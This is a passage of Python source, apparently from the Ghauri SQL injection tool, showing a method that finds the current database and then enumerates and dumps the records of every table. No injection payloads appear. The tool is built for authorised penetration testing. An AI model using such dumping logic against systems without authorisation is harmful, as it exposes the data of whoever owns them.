            dump_requested=dump_requested,
        )
        if retval_columns.ok:
            retval_dump = self.extract_records(
                database=database,
                table=table,
                columns=",".join(list(retval_columns.result)),
                start=start,
                stop=stop,
                dump_requested=dump_requested,
            )
            if retval_dump.ok:
                self._end(database=database, table=table, fetched=False)

    def dump_current_db(
        self, database="", start=0, stop=None, current_db=None, dump_requested=False
    ):
        logger.warning(
            "missing database parameter. Ghauri is going to use the current database to enumerate table(s) entries"
        )
        if not current_db:
            retval_current_db = self.extract_current_db()
            if retval_current_db.ok:
                current_db = retval_current_db.result.strip()
        if current_db:
            retval_tables = self.extract_tables(
                database=current_db,
                start=start,
                stop=stop,
                dump_requested=dump_requested,
            )
            if retval_tables.ok:
                for table in retval_tables.result:
                    retval_columns = self.extract_columns(
                        database=current_db,
                        table=table,
                        start=start,
                        stop=stop,
                        dump_requested=dump_requested,
                    )
                    if retval_columns.ok:
                        retval_dump = self.extract_records(
                            database=current_db,
                            table=table,
                            columns=",".join(list(retval_columns.result)),
                            start=start,
                            stop=stop,
                            dump_requested=dump_requested,
                        )
                        if retval_dump.ok:
                            self._end(database=current_db, table=table, fetched=False)
        else:
            logger.error(
                "Ghauri is expecting database name to enumerate table(s) entries."
            )
